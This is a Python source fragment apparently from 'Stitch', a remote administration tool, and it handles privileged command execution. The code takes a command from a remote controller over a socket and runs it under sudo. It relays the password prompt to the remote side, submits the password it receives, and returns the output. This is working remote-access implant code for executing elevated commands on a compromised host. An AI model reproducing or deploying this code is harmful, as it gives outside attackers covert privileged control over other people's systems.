# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import socket
import pexpect
import subprocess

cmd = receive(client_socket)
check = cmd
child = pexpect.spawn('sudo {}'.format(cmd))
passw = ['Password.*:','.*password.*:']
try:
    child.expect(passw,timeout=2)
except Exception as e:
    child.close
    cmd = run_command("sudo {}".format(cmd))
    send(client_socket,'sudo_success')
    send(client_socket,cmd)

if cmd == check:
    try:
        failure = ['.*try again.*assword.*:','.*try again.*sudo: 3 incorrect password attempts.*']
        send(client_socket,'Please enter sudo password:')
        p = receive(client_socket)
        child.sendline(p)
        i = child.expect(failure, timeout=2)
        while i == 0:
            send(client_socket,'Sorry incorrect\nPlease enter sudo password:')
            p = receive(client_socket)
            child.sendline(p)
            i = child.expect(failure, timeout=2)
        if i == 1:
            send(client_socket,'sudo: 3 incorrect password attempts')
    except Exception as e:
        cmd = child.before
        send(client_socket,'sudo_success')
        send(client_socket,cmd)

child.close
